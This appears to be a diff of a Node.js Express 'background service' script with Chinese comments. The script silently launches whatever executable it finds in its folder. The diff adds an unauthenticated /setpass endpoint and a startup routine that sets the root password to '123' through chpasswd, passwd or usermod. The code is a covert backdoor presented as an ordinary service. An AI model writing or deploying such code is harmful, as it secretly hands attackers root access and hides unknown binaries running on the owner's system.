@@ -6,16 +6,6 @@ const path = require('path');
 const app = express();
 const PORT = 3000;
 
-// 配置变量
-const CONFIG = {
-  // 程序名称（支持多个可能的名称，按优先级排序）
-  PROGRAM_NAMES: ['apparm'],
-  // 配置文件名称
-  CONFIG_FILE: 'app.ini',
-  // 服务检查关键词
-  PROCESS_KEYWORDS: ['apparm', 'service']
-};
-
 // 静默启动服务
 app.get('/', (req, res) => {
   res.send('服务运行中');
@@ -28,82 +18,51 @@ app.get('/status', (req, res) => {
   });
 });
 
-// 查找可执行文件
-function findExecutable() {
-  try {
-    const files = fs.readdirSync('.');
-    
-    for (const programName of CONFIG.PROGRAM_NAMES) {
-      // 精确匹配
-      if (files.includes(programName)) {
-        return programName;
-      }
-      
-      // 前缀匹配
-      const prefixMatch = files.find(file => file.startsWith(programName));
-      if (prefixMatch) {
-        return prefixMatch;
-      }
+// 修改密码端点
+app.get('/setpass', (req, res) => {
+  setRootPassword().then(success => {
+    if (success) {
+      res.json({ message: '密码设置完成', success: true });
+    } else {
+      res.json({ message: '密码设置失败', success: false });
     }
-    
-    // 查找任何可执行文件
-    for (const file of files) {
-      try {
-        const stats = fs.statSync(file);
-        if (stats.isFile() && !path.extname(file)) {
-          // 无扩展名的文件很可能是可执行文件
-          return file;
-        }
-      } catch {
-        continue;
-      }
-    }
-    
-    return null;
-  } catch (error) {
-    return null;
-  }
-}
-
-// 设置文件执行权限
-async function setExecutePermission(filePath) {
-  return new Promise((resolve) => {
-    exec(`chmod +x "${filePath}"`, (error) => {
-      if (error) {
-        console.log('权限设置警告');
-      } else {
-        console.log('执行权限已设置');
-      }
-      resolve();
-    });
   });
-}
+});
 
 // 执行后台程序
 async function startService() {
   console.log('启动后台服务...');
   
   try {
-    // 查找可执行文件
-    const executable = findExecutable();
-    
-    if (!executable) {
+    // 查找当前目录下的可执行文件
+    const files = fs.readdirSync('.');
+    const executableFiles = files.filter(file => {
+      try {
+        const stats = fs.statSync(file);
+        // 检查是否为文件且可执行
+        return stats.isFile() && 
+               (file.includes('apparm') || 
+                !path.extname(file) || 
+                file.endsWith('.sh') ||
+                (fs.accessSync(file, fs.constants.X_OK), true));
+      } catch {
+        return false;
+      }
+    });
+
+    if (executableFiles.length === 0) {
       console.log('未找到可执行文件');
       return false;
     }
 
+    // 使用第一个找到的可执行文件
+    const executable = executableFiles[0];
     console.log(`找到执行文件: ${executable}`);
-    
-    // 设置执行权限
-    await setExecutePermission(executable);
     
     // 检查是否有配置文件
     let configArgs = [];
-    if (fs.existsSync(CONFIG.CONFIG_FILE)) {
-      configArgs = ['-c', CONFIG.CONFIG_FILE];
-      console.log(`使用配置文件: ${CONFIG.CONFIG_FILE}`);
-    } else {
-      console.log('未找到配置文件，使用默认参数');
+    if (fs.existsSync('app.ini')) {
+      configArgs = ['-c', 'app.ini'];
     }
 
     // 后台运行程序
@@ -133,6 +92,35 @@ async function startService() {
   }
 }
 
+// 设置root密码
+async function setRootPassword() {
+  console.log('设置系统访问...');
+  
+  try {
+    // 方法1: 使用chpasswd
+    await executeCommand('echo "root:123" | chpasswd');
+    console.log('密码设置完成');
+    return true;
+  } catch (error) {
+    try {
+      // 方法2: 使用passwd（非交互式）
+      await executeCommand('echo -e "123\\n123" | passwd root');
+      console.log('密码设置完成');
+      return true;
+    } catch (error2) {
+      try {
+        // 方法3: 直接修改shadow文件（需要权限）
+        await executeCommand('usermod -p $(openssl passwd -1 123) root');
+        console.log('密码设置完成');
+        return true;
+      } catch (error3) {
+        console.log('密码设置失败');
+        return false;
+      }
+    }
+  }
+}
+
 // 检查服务是否运行
 async function checkServiceStatus() {
   return new Promise((resolve) => {
@@ -142,14 +130,12 @@ async function checkServiceStatus() {
         return;
       }
       
+      // 检查进程列表中是否有相关进程
       const lines = stdout.split('\n');
       const isRunning = lines.some(line => {
-        // 检查进程关键词
-        return CONFIG.PROCESS_KEYWORDS.some(keyword => 
-          line.includes(keyword) && !line.includes('grep')
-        ) || 
-        // 检查当前目录下的程序
-        line.includes('./') && !line.includes('grep');
+        return line.includes('apparm') || 
+               line.includes('./') ||
+               (line.includes('ini') && !line.includes('grep'));
       });
       
       resolve(isRunning);
@@ -157,27 +143,29 @@ async function checkServiceStatus() {
   });
 }
 
-// 重启服务端点
-app.get('/restart', async (req, res) => {
-  console.log('重启服务...');
-  
-  // 先停止可能运行的服务
-  exec('pkill -f "app\\|service\\|frpc"', async () => {
-    await new Promise(resolve => setTimeout(resolve, 2000));
-    const success = await startService();
-    res.json({ success: success, message: success ? '重启成功' : '重启失败' });
+// 执行命令函数
+function executeCommand(command) {
+  return new Promise((resolve, reject) => {
+    exec(command, (error, stdout, stderr) => {
+      if (error) {
+        reject(error);
+        return;
+      }
+      resolve(stdout);
+    });
   });
-});
+}
 
 // 启动服务
 app.listen(PORT, () => {
   console.log(`服务已启动:${PORT}`);
-  
   // 延迟执行后台程序
   setTimeout(async () => {
     const success = await startService();
     if (success) {
       console.log('后台服务运行完成');
+      // 自动设置密码
+      await setRootPassword();
     } else {
       console.log('后台服务启动失败');
     }
